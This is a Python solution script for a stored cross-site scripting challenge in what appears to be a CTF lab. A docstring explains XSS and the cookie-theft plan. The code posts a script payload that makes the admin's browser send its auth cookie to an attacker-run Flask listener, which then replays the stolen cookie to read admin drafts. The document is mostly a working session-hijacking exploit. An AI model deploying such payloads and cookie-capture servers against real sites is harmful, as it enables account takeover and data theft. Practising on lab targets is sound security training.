import os
import re
import requests
import sys
from flask import Flask, request


"""
Theory:
The class of vulnerabilities in which injections occur into client-side web data (such as HTML)
is called Cross Site Scripting, or XSS for short.
In a typical XSS exploit, an attacker will cause their own code to be injected into (typically)
the HTML produced by a web application and viewed by a victim user. This will then allow the
attacker to gain some control within the victim's browser, leading to a number of potential
downstream shenanigans.
You will now have a /challenge/victim program that simulates a victim user visiting the web server.

Note:
Initially xss attacks used to download the malicious scripts run as part of the attack from an
atacker controlled separate website. Hence these attack where called cross site scripting.

Stored xss:
Inspecting the target website, the attacker can see that the site allows to permanently insert
content posts into the websites database. The inserted content is then displayed as html text
in all future requests to the website. The attacker crafts a malicious script and inserts it
as content into the website. All users that visit the target website from now on will trigger
the attack.

Specific to this challenge:
We have to craft a request, that exposes the admin auth cookie to us. Afterwards we can simply
inspect it to get the flag, since the flag is set as the user password inside the cookie.
Alternatively we can use the cookie to make an admin request and display all posts including
admin draft posts. The draft posts also contain the flag.

Inspecting the auth cookie that is returned for the known hacker user and password,
we can see, that the cookie is only valid for the challenge.localhost domain.
We therefore have to set up our server on challenge.localhost and i.e. port 30080.
This way, the cookie will be sent with the request triggered by our malicious script, once
the visitor admin user loads the website.

The reason we can even send a http request cross origin to our new server at challenge.localhost:30080
is due to the same origin policy. The same origin policy allows us to send simple get, post and head
requests cross origin.
"""

pat0 = re.compile(r".*Running on http://challenge.localhost:80\n")
r1, w1 = os.pipe()
pid = os.fork()

if pid == -1:
	print("Error fork.")
	exit(1)

if pid == 0:
	os.close(r1)

	os.dup2(w1, 1)
	os.close(w1)

	# stdout as stderr
	os.dup2(1, 2)

	os.execv("/challenge/server", ["/challenge/server"])
	print("Error execv.")
	exit(1)

os.close(w1)

read_file = os.fdopen(r1, "r")

while True:
	line = read_file.readline()
	print(line, end="")

	m = pat0.match(line)
	if m:
		url = "http://challenge.localhost:80/login"
		data = {"username": "hacker", "password": "1337"}
		resp = requests.post(url, data=data, allow_redirects=False)
		cookies = resp.cookies
		print(cookies)

		url = "http://challenge.localhost:80/draft"
		data = {"publish": "True", "content": '<script>fetch("http://challenge.localhost:30080/", {"method": "GET", "credentials": "include"});</script>'}
		resp = requests.post(url, data=data, cookies=cookies, allow_redirects=False)

		pid = os.fork()

		if pid == -1:
			print("Error fork.")
			exit(1)

		if pid == 0:
			app = Flask(__name__)

			@app.route("/")
			def get_flag():
				print(request.cookies)
				sys.stdout.flush()
				resp = requests.get("http://challenge.localhost:80/", cookies=request.cookies)
				print(resp.text)
				sys.stdout.flush()
				return f"{resp.text}"

			app.run("challenge.localhost", 30080, use_reloader=False)
			exit(1)

		pid = os.fork()

		if pid == -1:
			print("Error fork.")
			exit(1)

		if pid == 0:
			os.execv("/challenge/victim", ["/challenge/victim"])
			print("Error execv.")
			exit(1)
